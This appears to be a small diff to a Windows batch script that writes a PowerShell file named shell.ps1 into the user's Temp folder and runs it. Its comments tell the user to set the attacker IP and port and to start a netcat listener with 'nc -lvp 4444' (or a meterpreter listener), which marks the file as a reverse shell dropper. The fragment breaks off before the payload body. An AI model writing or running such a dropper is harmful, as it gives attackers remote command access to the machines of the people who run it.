@@ -1,7 +1,7 @@
 ```batch
 @echo off
 rem Batch file will create Powershell script and run it after created
-rem Modify IP and Port as required
+rem Modify IP ($address) and Port ($port) as required
 rem start nc listener (for more fun start a meter listener)
 rem nc -lvp 4444
 echo function cleanup { > "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
